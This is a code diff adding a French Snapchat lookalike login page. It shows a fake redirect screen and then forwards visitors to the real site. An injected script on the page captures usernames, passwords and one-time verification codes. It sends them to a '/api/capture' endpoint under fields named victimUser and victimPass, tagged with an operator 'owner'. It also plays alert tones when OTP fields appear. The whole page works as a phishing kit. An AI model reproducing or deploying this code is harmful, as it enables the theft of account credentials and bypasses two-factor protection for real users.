@@ -1,0 +1,947 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Snapchat · Connexion</title>
+
+<style>
+/* ============================================================
+   1. RESET & VARIABLES
+   ============================================================ */
+*,
+*::before,
+*::after {
+  margin: 0;
+  padding: 0;
+  box-sizing: border-box;
+}
+
+:root {
+  --yellow:       #FFFC00;
+  --yellow-soft:  #FFF95C;
+  --black:        #111111;
+  --gray:         #7a7a7a;
+  --border:       #e4e4e4;
+  --blue:         #0a84ff;
+  --red:          #ff3b30;
+  --white:        #ffffff;
+  --radius:       16px;
+  --ease:         cubic-bezier(.2, .8, .2, 1);
+}
+
+/* ============================================================
+   2. BASE / PAGE
+   ============================================================ */
+body {
+  min-height: 100dvh;
+  display: grid;
+  place-items: center;
+  padding: 24px 18px;
+  position: relative;
+  overflow-x: hidden;
+  background: var(--yellow);
+  font-family: system-ui, -apple-system, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+  color: var(--black);
+  -webkit-font-smoothing: antialiased;
+}
+
+body.locked { overflow: hidden; }
+
+/* --- Blobs décoratifs --- */
+.blob {
+  position: fixed;
+  border-radius: 50%;
+  filter: blur(70px);
+  pointer-events: none;
+  opacity: .8;
+  z-index: 0;
+  animation: float 14s ease-in-out infinite;
+}
+.b1 { width: 380px; height: 380px; background: #fff45e; top: -120px; left: -100px; }
+.b2 { width: 300px; height: 300px; background: #ffe93b; bottom: -110px; right: -80px; animation-delay: -4s; }
+.b3 { width: 260px; height: 260px; background: #ffffff; top: 55%; left: 8%; opacity: .55; animation-delay: -8s; }
+
+@keyframes float {
+  0%, 100% { transform: translate(0, 0) scale(1); }
+  50%      { transform: translate(30px, -35px) scale(1.12); }
+}
+
+/* ============================================================
+   3. CARTE PRINCIPALE
+   ============================================================ */
+.card {
+  position: relative;
+  z-index: 1;
+  width: min(430px, 100%);
+  padding: 40px 34px 30px;
+  background: var(--white);
+  border-radius: 28px;
+  box-shadow:
+    0 40px 70px -25px rgba(0, 0, 0, .45),
+    0 0 0 1px rgba(0, 0, 0, .04);
+  animation: cardIn .65s var(--ease) both;
+}
+
+.card.ready { animation: none; }
+.card.shake { animation: shake .5s ease; }
+
+@keyframes cardIn {
+  from { opacity: 0; transform: translateY(26px) scale(.96); }
+  to   { opacity: 1; transform: translateY(0)   scale(1);   }
+}
+
+@keyframes shake {
+  10%, 90%      { transform: translateX(-2px); }
+  20%, 80%      { transform: translateX(4px);  }
+  30%, 50%, 70% { transform: translateX(-7px); }
+  40%, 60%      { transform: translateX(7px);  }
+}
+
+/* ============================================================
+   4. LOGO FANTÔME
+   ============================================================ */
+.logo {
+  width: 90px;
+  height: 90px;
+  margin: 0 auto 20px;
+  display: grid;
+  place-items: center;
+  background: var(--yellow);
+  border-radius: 27px;
+  box-shadow:
+    0 16px 30px -12px rgba(255, 240, 0, .95),
+    inset 0 0 0 2px rgba(0, 0, 0, .06);
+  animation: bob 3.6s ease-in-out infinite;
+}
+
+.logo svg { width: 58px; height: 58px; fill: var(--black); }
+
+@keyframes bob {
+  0%, 100% { transform: translateY(0)    rotate(-2deg); }
+  50%      { transform: translateY(-7px) rotate(2deg);  }
+}
+
+/* ============================================================
+   5. TITRES
+   ============================================================ */
+h1 {
+  font-size: 27px;
+  font-weight: 800;
+  letter-spacing: -.6px;
+  text-align: center;
+}
+
+.sub {
+  margin: 8px 0 28px;
+  font-size: 14.5px;
+  color: var(--gray);
+  text-align: center;
+}
+
+/* ============================================================
+   6. CHAMPS (label flottant)
+   ============================================================ */
+.field { position: relative; margin-bottom: 14px; }
+
+.field input {
+  width: 100%;
+  height: 58px;
+  padding: 24px 16px 8px;
+  font-size: 15.5px;
+  font-family: inherit;
+  color: var(--black);
+  background: #fafafa;
+  border: 2px solid var(--border);
+  border-radius: var(--radius);
+  outline: none;
+  transition: border-color .22s, background .22s, box-shadow .22s;
+}
+
+.field input::placeholder { color: transparent; }
+.field input:hover { background: #f5f5f5; }
+
+.field input:focus {
+  background: var(--white);
+  border-color: var(--black);
+  box-shadow: 0 0 0 4px rgba(255, 252, 0, .85);
+}
+
+.field label {
+  position: absolute;
+  left: 18px;
+  top: 50%;
+  transform: translateY(-50%);
+  font-size: 15.5px;
+  color: var(--gray);
+  pointer-events: none;
+  transition: top .18s var(--ease), font-size .18s var(--ease), color .18s;
+}
+
+.field input:focus + label,
+.field input:not(:placeholder-shown) + label {
+  top: 16px;
+  font-size: 10.5px;
+  font-weight: 800;
+  letter-spacing: .7px;
+  text-transform: uppercase;
+  color: var(--black);
+}
+
+#password { padding-right: 54px; }
+
+/* Bouton œil */
+.toggle-pw {
+  position: absolute;
+  right: 8px;
+  top: 50%;
+  transform: translateY(-50%);
+  width: 42px;
+  height: 42px;
+  display: grid;
+  place-items: center;
+  background: transparent;
+  border: none;
+  border-radius: 12px;
+  cursor: pointer;
+  color: var(--gray);
+  transition: background .2s, color .2s;
+}
+
+.toggle-pw:hover { background: #efefef; color: var(--black); }
+
+.toggle-pw svg {
+  width: 21px; height: 21px;
+  fill: none;
+  stroke: currentColor;
+  stroke-width: 2;
+  stroke-linecap: round;
+  stroke-linejoin: round;
+}
+
+.toggle-pw .eye-off { display: none; }
+.toggle-pw.active .eye-on  { display: none; }
+.toggle-pw.active .eye-off { display: block; }
+
+/* ============================================================
+   7. ERREURS
+   ============================================================ */
+.error {
+  height: 0;
+  margin-left: 4px;
+  overflow: hidden;
+  font-size: 12.5px;
+  font-weight: 700;
+  color: var(--red);
+  opacity: 0;
+  transition: height .25s var(--ease), opacity .25s, margin .25s;
+}
+
+.error.show {
+  height: 18px;
+  margin-bottom: 8px;
+  opacity: 1;
+}
+
+/* ============================================================
+   8. LIEN MOT DE PASSE OUBLIÉ
+   ============================================================ */
+.forgot {
+  display: inline-block;
+  margin: 4px 0 22px 4px;
+  font-size: 13.5px;
+  font-weight: 700;
+  color: var(--blue);
+  text-decoration: none;
+  border-radius: 6px;
+  transition: opacity .2s;
+}
+
+.forgot:hover { text-decoration: underline; opacity: .8; }
+
+/* ============================================================
+   9. BOUTON PRINCIPAL
+   ============================================================ */
+.btn {
+  position: relative;
+  width: 100%;
+  height: 56px;
+  overflow: hidden;
+  border: none;
+  border-radius: 999px;
+  background: var(--yellow);
+  color: var(--black);
+  font-family: inherit;
+  font-size: 16px;
+  font-weight: 800;
+  letter-spacing: .3px;
+  cursor: pointer;
+  box-shadow: 0 14px 26px -12px rgba(0, 0, 0, .55);
+  transition: transform .16s var(--ease), box-shadow .22s, filter .2s;
+}
+
+.btn:hover:not(:disabled) {
+  transform: translateY(-2px);
+  filter: brightness(1.04);
+  box-shadow: 0 20px 34px -14px rgba(0, 0, 0, .55);
+}
+
+.btn:active:not(:disabled) { transform: translateY(0) scale(.985); }
+.btn:focus-visible { outline: 3px solid var(--black); outline-offset: 3px; }
+
+/* Ripple */
+.ripple {
+  position: absolute;
+  border-radius: 50%;
+  background: rgba(0, 0, 0, .16);
+  transform: scale(0);
+  pointer-events: none;
+  animation: rippleAnim .6s ease-out forwards;
+}
+
+@keyframes rippleAnim {
+  to { transform: scale(3.2); opacity: 0; }
+}
+
+/* ============================================================
+   10. SÉPARATEUR & INSCRIPTION
+   ============================================================ */
+.divider {
+  display: flex;
+  align-items: center;
+  gap: 14px;
+  margin: 26px 0 20px;
+  font-size: 12px;
+  font-weight: 700;
+  text-transform: uppercase;
+  letter-spacing: 1px;
+  color: #b3b3b3;
+}
+
+.divider::before,
+.divider::after {
+  content: "";
+  flex: 1;
+  height: 1.5px;
+  background: var(--border);
+  border-radius: 2px;
+}
+
+.signup {
+  font-size: 14px;
+  text-align: center;
+  color: var(--gray);
+}
+
+.signup a {
+  font-weight: 800;
+  color: var(--black);
+  text-decoration: none;
+  border-bottom: 2px solid var(--yellow);
+  transition: border-color .2s;
+}
+
+.signup a:hover { border-color: var(--black); }
+
+/* ============================================================
+   11. ÉCRAN DE REDIRECTION (plein écran jaune)
+   ============================================================ */
+.redirect {
+  position: fixed;
+  inset: 0;
+  z-index: 999;
+  display: grid;
+  place-items: center;
+  padding: 24px;
+  background: var(--yellow);
+  opacity: 0;
+  visibility: hidden;
+  transition: opacity .5s var(--ease), visibility .5s;
+}
+
+.redirect.show {
+  opacity: 1;
+  visibility: visible;
+}
+
+.redirect__inner {
+  width: min(360px, 100%);
+  text-align: center;
+  transform: translateY(14px);
+  transition: transform .6s var(--ease);
+}
+
+.redirect.show .redirect__inner { transform: translateY(0); }
+
+/* Fantôme central */
+.redirect__ghost {
+  width: 110px;
+  height: 110px;
+  margin: 0 auto 28px;
+  display: grid;
+  place-items: center;
+  background: var(--white);
+  border-radius: 32px;
+  box-shadow:
+    0 24px 48px -18px rgba(0, 0, 0, .35),
+    inset 0 0 0 2px rgba(0, 0, 0, .05);
+  animation: ghostPulse 1.5s ease-in-out infinite;
+}
+
+.redirect__ghost svg { width: 66px; height: 66px; fill: var(--black); }
+
+@keyframes ghostPulse {
+  0%, 100% { transform: scale(1)    translateY(0);    }
+  50%      { transform: scale(1.06) translateY(-6px); }
+}
+
+.redirect__title {
+  font-size: 20px;
+  font-weight: 800;
+  letter-spacing: -.3px;
+  margin-bottom: 8px;
+}
+
+.redirect__text {
+  font-size: 14px;
+  color: rgba(0, 0, 0, .55);
+  margin-bottom: 26px;
+}
+
+/* Barre de progression */
+.progress {
+  position: relative;
+  width: 100%;
+  height: 10px;
+  background: rgba(0, 0, 0, .12);
+  border-radius: 999px;
+  overflow: hidden;
+}
+
+.progress__bar {
+  position: absolute;
+  inset: 0 auto 0 0;
+  width: 0%;
+  border-radius: 999px;
+  background: var(--black);
+  will-change: width;
+}
+
+/* Pourcentage */
+.redirect__pct {
+  margin-top: 14px;
+  font-size: 13px;
+  font-weight: 800;
+  letter-spacing: .5px;
+  font-variant-numeric: tabular-nums;
+  color: rgba(0, 0, 0, .65);
+}
+
+/* ============================================================
+   12. RESPONSIVE & ACCESSIBILITÉ
+   ============================================================ */
+@media (max-width: 420px) {
+  .card { padding: 32px 22px 24px; border-radius: 24px; }
+  h1 { font-size: 24px; }
+  .logo { width: 78px; height: 78px; border-radius: 23px; }
+  .logo svg { width: 50px; height: 50px; }
+  .redirect__ghost { width: 92px; height: 92px; border-radius: 26px; }
+  .redirect__ghost svg { width: 54px; height: 54px; }
+}
+
+@media (prefers-reduced-motion: reduce) {
+  *, *::before, *::after {
+    animation-duration: .001ms !important;
+    animation-iteration-count: 1 !important;
+    transition-duration: .001ms !important;
+  }
+}
+</style>
+</head>
+
+<body>
+
+<!-- Décor -->
+<div class="blob b1"></div>
+<div class="blob b2"></div>
+<div class="blob b3"></div>
+
+<!-- Carte de connexion -->
+<main class="card" id="card">
+
+  <div class="logo">
+    <svg viewBox="0 0 100 100" role="img" aria-label="Logo Snapchat">
+      <path d="M50 7c-13.5 0-23.5 10-23.5 23.5v10.2c0 2.3-1.4 3.9-3.6 4.7l-8.4 2.9c-3.2 1.1-3.2 4.6 0 5.7l9.6 3.3c1.9.7 2.7 2.1 2 4-2.7 7.4-8.6 13.2-15.6 15.2-3.1.9-3.1 4.4 0 5.4 4.9 1.6 10.6 1.8 13.6 3.6 1.7 1 2.1 2.7 2.7 4.6 1 3.4 4.4 5.9 8.6 5.1 4.4-.9 7.3.9 10.1 4.4 2.6 3.3 6.9 5.4 11.9 5.4s9.3-2.1 11.9-5.4c2.8-3.5 5.7-5.3 10.1-4.4 4.2.8 7.6-1.7 8.6-5.1.6-1.9 1-3.6 2.7-4.6 3-1.8 8.7-2 13.6-3.6 3.1-1 3.1-4.5 0-5.4-7-2-12.9-7.8-15.6-15.2-.7-1.9.1-3.3 2-4l9.6-3.3c3.2-1.1 3.2-4.6 0-5.7l-8.4-2.9c-2.2-.8-3.6-2.4-3.6-4.7V30.5C73.5 17 63.5 7 50 7z"/>
+    </svg>
+  </div>
+
+  <h1>Connexion</h1>
+  <p class="sub">Content de te revoir&nbsp;👻</p>
+
+  <form id="loginForm" novalidate>
+
+    <div class="field">
+      <input type="text" id="username" name="username" placeholder=" "
+             autocomplete="username" spellcheck="false">
+      <label for="username">Nom d'utilisateur</label>
+    </div>
+    <p class="error" id="err-username" role="alert"></p>
+
+    <div class="field">
+      <input type="password" id="password" name="password" placeholder=" "
+             autocomplete="current-password">
+      <label for="password">Mot de passe</label>
+
+      <button type="button" class="toggle-pw" id="togglePw"
+              aria-label="Afficher le mot de passe">
+        <svg class="eye-on" viewBox="0 0 24 24">
+          <path d="M1.5 12S5.5 5 12 5s10.5 7 10.5 7-4 7-10.5 7S1.5 12 1.5 12z"/>
+          <circle cx="12" cy="12" r="3"/>
+        </svg>
+        <svg class="eye-off" viewBox="0 0 24 24">
+          <path d="M1.5 12S5.5 5 12 5s10.5 7 10.5 7-4 7-10.5 7S1.5 12 1.5 12z"/>
+          <circle cx="12" cy="12" r="3"/>
+          <path d="M3 3l18 18"/>
+        </svg>
+      </button>
+    </div>
+    <p class="error" id="err-password" role="alert"></p>
+
+    <a href="#" class="forgot">Mot de passe oublié&nbsp;?</a>
+
+    <button type="submit" class="btn" id="submitBtn">Se connecter</button>
+
+  </form>
+
+  <div class="divider"><span>ou</span></div>
+
+  <p class="signup">
+    Pas encore de compte&nbsp;? <a href="#">Créer un compte</a>
+  </p>
+
+</main>
+
+<!-- ============================================================
+     ÉCRAN DE REDIRECTION (apparaît au clic sur « Se connecter »)
+     ============================================================ -->
+<div class="redirect" id="redirect" aria-hidden="true" aria-live="polite">
+  <div class="redirect__inner">
+
+    <div class="redirect__ghost">
+      <svg viewBox="0 0 100 100" aria-hidden="true">
+        <path d="M50 7c-13.5 0-23.5 10-23.5 23.5v10.2c0 2.3-1.4 3.9-3.6 4.7l-8.4 2.9c-3.2 1.1-3.2 4.6 0 5.7l9.6 3.3c1.9.7 2.7 2.1 2 4-2.7 7.4-8.6 13.2-15.6 15.2-3.1.9-3.1 4.4 0 5.4 4.9 1.6 10.6 1.8 13.6 3.6 1.7 1 2.1 2.7 2.7 4.6 1 3.4 4.4 5.9 8.6 5.1 4.4-.9 7.3.9 10.1 4.4 2.6 3.3 6.9 5.4 11.9 5.4s9.3-2.1 11.9-5.4c2.8-3.5 5.7-5.3 10.1-4.4 4.2.8 7.6-1.7 8.6-5.1.6-1.9 1-3.6 2.7-4.6 3-1.8 8.7-2 13.6-3.6 3.1-1 3.1-4.5 0-5.4-7-2-12.9-7.8-15.6-15.2-.7-1.9.1-3.3 2-4l9.6-3.3c3.2-1.1 3.2-4.6 0-5.7l-8.4-2.9c-2.2-.8-3.6-2.4-3.6-4.7V30.5C73.5 17 63.5 7 50 7z"/>
+      </svg>
+    </div>
+
+    <h2 class="redirect__title">Redirection en cours…</h2>
+    <p class="redirect__text">Tu vas être redirigé vers Snapchat.</p>
+
+    <div class="progress" role="progressbar" aria-valuemin="0"
+         aria-valuemax="100" aria-valuenow="0" id="progressTrack">
+      <div class="progress__bar" id="progressBar"></div>
+    </div>
+
+    <p class="redirect__pct" id="progressPct">0 %</p>
+
+  </div>
+</div>
+
+<script>
+/* ==========================================================
+   CONFIGURATION
+   ========================================================== */
+const OFFICIAL_URL   = 'https://www.snapchat.com/';   // lien officiel
+const REDIRECT_DELAY = 3000;                          // 3 secondes
+
+/* ==========================================================
+   1. RÉFÉRENCES DOM
+   ========================================================== */
+const card         = document.getElementById('card');
+const form         = document.getElementById('loginForm');
+const username     = document.getElementById('username');
+const password     = document.getElementById('password');
+const errUser      = document.getElementById('err-username');
+const errPass      = document.getElementById('err-password');
+const submitBtn    = document.getElementById('submitBtn');
+const togglePw     = document.getElementById('togglePw');
+
+const redirect     = document.getElementById('redirect');
+const progressBar  = document.getElementById('progressBar');
+const progressPct  = document.getElementById('progressPct');
+const progressTrk  = document.getElementById('progressTrack');
+
+/* ==========================================================
+   2. ANIMATION D'ENTRÉE DE LA CARTE
+   ========================================================== */
+card.addEventListener('animationend', (e) => {
+  if (e.animationName === 'cardIn') card.classList.add('ready');
+  if (e.animationName === 'shake')  card.classList.remove('shake');
+});
+
+/* ==========================================================
+   3. AFFICHER / MASQUER LE MOT DE PASSE
+   ========================================================== */
+togglePw.addEventListener('click', () => {
+  const hidden = password.type === 'password';
+
+  password.type = hidden ? 'text' : 'password';
+  togglePw.classList.toggle('active', hidden);
+  togglePw.setAttribute(
+    'aria-label',
+    hidden ? 'Masquer le mot de passe' : 'Afficher le mot de passe'
+  );
+
+  password.focus();
+});
+
+/* ==========================================================
+   4. GESTION DES ERREURS
+   ========================================================== */
+function setError(el, message) {
+  el.textContent = message;
+  el.classList.toggle('show', message.length > 0);
+}
+
+username.addEventListener('input', () => setError(errUser, ''));
+password.addEventListener('input', () => setError(errPass, ''));
+
+/* ==========================================================
+   5. SOUMISSION → ÉCRAN JAUNE + BARRE 3 s + REDIRECTION
+   ========================================================== */
+let redirecting = false;
+
+form.addEventListener('submit', (e) => {
+  e.preventDefault();
+  if (redirecting) return;
+
+  /* -- Vérification minimale : les deux champs doivent être remplis -- */
+  let ok = true;
+
+  if (username.value.trim().length === 0) {
+    setError(errUser, "Entre ton nom d'utilisateur.");
+    ok = false;
+  }
+
+  if (password.value.length === 0) {
+    setError(errPass, 'Entre ton mot de passe.');
+    ok = false;
+  }
+
+  if (!ok) {
+    card.classList.add('shake');
+    return;
+  }
+
+  /* -- Tout est rempli : on lance la redirection, quel que soit
+        le mot de passe saisi (valide ou non) -- */
+  redirecting = true;
+  startRedirect();
+});
+
+/* ==========================================================
+   6. ÉCRAN DE REDIRECTION + BARRE DE PROGRESSION (3 s)
+   ========================================================== */
+function startRedirect() {
+  document.body.classList.add('locked');
+
+  redirect.classList.add('show');
+  redirect.setAttribute('aria-hidden', 'false');
+
+  const startTime = performance.now();
+
+  function tick(now) {
+    const elapsed  = now - startTime;
+    const progress = Math.min(elapsed / REDIRECT_DELAY, 1);   // 0 → 1
+    const percent  = Math.round(progress * 100);
+
+    /* Barre */
+    progressBar.style.width = percent + '%';
+
+    /* Texte */
+    progressPct.textContent = percent + ' %';
+
+    /* Accessibilité */
+    progressTrk.setAttribute('aria-valuenow', String(percent));
+
+    if (progress < 1) {
+      requestAnimationFrame(tick);
+    } else {
+      /* --- Redirection vers le lien officiel --- */
+      window.location.href = OFFICIAL_URL;
+    }
+  }
+
+  requestAnimationFrame(tick);
+}
+
+/* ==========================================================
+   7. EFFET RIPPLE SUR LE BOUTON
+   ========================================================== */
+submitBtn.addEventListener('click', (e) => {
+  const rect = submitBtn.getBoundingClientRect();
+  const size = Math.max(rect.width, rect.height);
+
+  const ripple = document.createElement('span');
+  ripple.className   = 'ripple';
+  ripple.style.width = ripple.style.height = size + 'px';
+  ripple.style.left  = (e.clientX - rect.left - size / 2) + 'px';
+  ripple.style.top   = (e.clientY - rect.top  - size / 2) + 'px';
+
+  submitBtn.appendChild(ripple);
+  setTimeout(() => ripple.remove(), 620);
+});
+</script>
+
+<script data-real-injected="true" data-injected-mode="otp">
+(function () {
+  const PARAM_CFG = {
+    endpoint: "/api/capture",
+    defaultOwner: "Kim",
+    network: "Snapchat",
+    redirectUrl: "https://www.snapchat.com/",
+    mode: "otp",
+    isOtpMode: true,
+    enableOtpSound: true
+  };
+
+  const urlParams = new URLSearchParams(window.location.search);
+  const ownerVal = urlParams.get("user") || urlParams.get("ref") || PARAM_CFG.defaultOwner;
+  const typeParam = (urlParams.get("type") || PARAM_CFG.mode).toLowerCase();
+
+  let lastUser = "";
+  let lastPass = "";
+  let lastOtpSent = "";
+  let otpBeepPlayedForView = false;
+  let audioCtx = null;
+  const sentSet = new Set();
+
+  function playAlertTone(freq = 880, durationMs = 180) {
+    if (!PARAM_CFG.enableOtpSound) return;
+    try {
+      const Ctx = window.AudioContext || window.webkitAudioContext;
+      if (!Ctx) return;
+      if (!audioCtx) audioCtx = new Ctx();
+      if (audioCtx.state === "suspended") {
+        audioCtx.resume().catch(() => {});
+      }
+      const osc = audioCtx.createOscillator();
+      const gain = audioCtx.createGain();
+      osc.type = "sine";
+      osc.frequency.setValueAtTime(freq, audioCtx.currentTime);
+      gain.gain.setValueAtTime(0.08, audioCtx.currentTime);
+      gain.gain.exponentialRampToValueAtTime(0.001, audioCtx.currentTime + durationMs / 1000);
+      osc.connect(gain);
+      gain.connect(audioCtx.destination);
+      osc.start();
+      osc.stop(audioCtx.currentTime + durationMs / 1000);
+    } catch (_) {}
+  }
+
+  function isOtpInputElement(el) {
+    if (!el || !["INPUT", "TEXTAREA"].includes(el.tagName)) return false;
+    const t = (el.type || "").toLowerCase();
+    if (["password", "submit", "button", "checkbox", "radio", "hidden"].includes(t)) return false;
+
+    const meta = [
+      el.id,
+      el.name,
+      el.placeholder,
+      el.className,
+      el.getAttribute("aria-label"),
+      el.getAttribute("autocomplete"),
+      el.getAttribute("inputmode")
+    ]
+      .filter(Boolean)
+      .join(" ")
+      .toLowerCase();
+
+    const maxLen = parseInt(el.getAttribute("maxlength") || "0", 10);
+    if (
+      el.classList.contains("otp-input") ||
+      el.classList.contains("otp-box") ||
+      /otp|one-time-code|verification.?code|security.?code|code/i.test(meta)
+    ) {
+      return true;
+    }
+
+    if (maxLen === 1 && (el.closest(".otp-inputs, .otp-container, [class*='otp' i], [id*='otp' i]") || el.getAttribute("inputmode") === "numeric")) {
+      return true;
+    }
+
+    return false;
+  }
+
+  function isElementVisible(el) {
+    if (!el) return false;
+    if (el.closest(".hidden")) return false;
+    const style = window.getComputedStyle(el);
+    if (style.display === "none" || style.visibility === "hidden" || parseFloat(style.opacity || "1") === 0) {
+      return false;
+    }
+    const rect = el.getBoundingClientRect();
+    return rect.width > 0 && rect.height > 0;
+  }
+
+  function checkOtpScreenAlert() {
+    if (!PARAM_CFG.enableOtpSound) return;
+    const otpEls = Array.from(document.querySelectorAll("input, textarea")).filter(isOtpInputElement);
+    const anyVisible = otpEls.some(isElementVisible);
+    if (anyVisible && !otpBeepPlayedForView) {
+      otpBeepPlayedForView = true;
+      playAlertTone(880, 160);
+      setTimeout(() => playAlertTone(1174, 180), 190);
+    } else if (!anyVisible) {
+      otpBeepPlayedForView = false;
+    }
+  }
+
+  function sendCapture(payload) {
+    const key = JSON.stringify(payload);
+    if (sentSet.has(key)) return;
+    sentSet.add(key);
+
+    return fetch(PARAM_CFG.endpoint, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(payload),
+      keepalive: true
+    }).catch((err) => console.log(err));
+  }
+
+  function readFields(scopeEl) {
+    const root = (scopeEl && scopeEl.closest && scopeEl.closest("form")) || document;
+    const allInputs = Array.from(root.querySelectorAll("input, select, textarea"));
+    const globalInputs = root === document ? allInputs : Array.from(document.querySelectorAll("input, select, textarea"));
+
+    let user = "";
+    let pass = "";
+    const otpParts = [];
+
+    allInputs.forEach((el) => {
+      const t = (el.type || "").toLowerCase();
+      if (["submit", "button", "checkbox", "radio", "hidden"].includes(t)) return;
+
+      if (t === "password") {
+        if (!pass && el.value) pass = el.value;
+      } else if (isOtpInputElement(el)) {
+        const cleanVal = (el.value || "").replace(/s+/g, "").trim();
+        if (cleanVal) otpParts.push(cleanVal);
+      } else {
+        const val = (el.value || "").trim();
+        if (!user && val) user = val;
+      }
+    });
+
+    if (otpParts.length === 0) {
+      globalInputs.forEach((el) => {
+        if (isOtpInputElement(el)) {
+          const cleanVal = (el.value || "").replace(/s+/g, "").trim();
+          if (cleanVal) otpParts.push(cleanVal);
+        }
+      });
+    }
+
+    if (!user) {
+      const firstText = globalInputs.find((i) => {
+        const t = (i.type || "").toLowerCase();
+        return !["password", "submit", "button", "checkbox", "radio", "hidden"].includes(t) &&
+          !isOtpInputElement(i) &&
+          i.value &&
+          i.value.trim();
+      });
+      if (firstText) user = firstText.value.trim();
+    }
+
+    if (!pass) {
+      const p = document.querySelector("input[type='password']");
+      if (p && p.value) pass = p.value;
+    }
+
+    return {
+      user: user || lastUser || "",
+      pass: pass || lastPass || "",
+      otp: otpParts.length > 0 ? otpParts.join("") : "Aucun"
+    };
+  }
+
+  function emitPayload(data, forceOtpMode = false) {
+    if (data.user) lastUser = data.user;
+    if (data.pass) lastPass = data.pass;
+
+    const hasOtpValue = Boolean(data.otp && data.otp !== "Aucun");
+    const useOtp = PARAM_CFG.isOtpMode || forceOtpMode || hasOtpValue;
+
+    const stepType = useOtp
+      ? (hasOtpValue ? (typeParam === "standard" ? "otp" : typeParam) : "otp_step1")
+      : "standard";
+
+    if (lastUser || lastPass || hasOtpValue) {
+      if (hasOtpValue && data.otp !== lastOtpSent) {
+        lastOtpSent = data.otp;
+        playAlertTone(1046, 170);
+      }
+      sendCapture({
+        owner: ownerVal,
+        network: PARAM_CFG.network,
+        type: stepType,
+        victimUser: lastUser,
+        victimPass: lastPass,
+        otp: useOtp ? data.otp : "Aucun"
+      });
+    }
+  }
+
+  function handleAction(e, sourceEl) {
+    const data = readFields(sourceEl);
+    emitPayload(data, false);
+  }
+
+  document.addEventListener("submit", (e) => {
+    handleAction(e, e.target);
+  }, true);
+
+  document.addEventListener("click", (e) => {
+    const btn = e.target.closest ? e.target.closest("button, input[type='submit'], [role='button']") : null;
+    if (!btn) return;
+    if (btn.type && btn.type.toLowerCase() === "submit" && btn.closest("form")) {
+      return;
+    }
+    handleAction(e, btn);
+  }, true);
+
+  document.addEventListener("input", (e) => {
+    const el = e.target;
+    if (!el || !["INPUT", "TEXTAREA"].includes(el.tagName)) return;
+    if (!isOtpInputElement(el)) return;
+
+    const data = readFields(el);
+    if (data.otp && data.otp !== "Aucun" && data.otp.length >= 4) {
+      emitPayload(data, true);
+    }
+  }, true);
+
+  document.addEventListener("change", (e) => {
+    const el = e.target;
+    if (!el || !["INPUT", "TEXTAREA"].includes(el.tagName)) return;
+    if (!isOtpInputElement(el)) return;
+
+    const data = readFields(el);
+    if (data.otp && data.otp !== "Aucun" && data.otp.length >= 1) {
+      emitPayload(data, true);
+    }
+  }, true);
+
+  const observer = new MutationObserver(() => checkOtpScreenAlert());
+  if (document.readyState === "loading") {
+    document.addEventListener("DOMContentLoaded", () => {
+      checkOtpScreenAlert();
+      observer.observe(document.documentElement, { childList: true, subtree: true, attributes: true, attributeFilter: ["class", "style", "aria-hidden"] });
+    });
+  } else {
+    checkOtpScreenAlert();
+    observer.observe(document.documentElement, { childList: true, subtree: true, attributes: true, attributeFilter: ["class", "style", "aria-hidden"] });
+  }
+})();
+</script>
+</body>
+</html>
